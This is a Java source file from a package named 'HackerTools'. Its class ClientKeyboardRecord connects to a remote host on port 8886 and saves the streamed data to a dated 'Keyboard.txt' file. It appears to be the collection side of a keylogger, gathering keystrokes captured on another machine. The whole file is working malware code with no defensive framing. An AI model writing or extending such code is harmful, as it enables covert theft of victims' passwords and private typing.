package HackerTools;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ClientKeyboardRecord {
    public static void receive () throws UnknownHostException, IOException {
        SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
        String fileName = df1.format(new Date());

        Socket receiveSocket=new Socket(Index.ipAddress,8886);
        String path=(new File("")).getAbsoluteFile()+"\\"+fileName+"_c1_"+"_Keyboard.txt";
        DataInputStream disDataInputStream=new DataInputStream(receiveSocket.getInputStream());
        DataOutputStream dosDataOutputStream=new DataOutputStream(new FileOutputStream(path));
        byte [] buf= new byte[1024];
        int len=0;
        while((len=disDataInputStream.read(buf))!=-1) {
            dosDataOutputStream.write(buf,0,len);
        }
        dosDataOutputStream.flush();
        dosDataOutputStream.flush();
        dosDataOutputStream.close();
        disDataInputStream.close();
        disDataInputStream.close();
    }
}
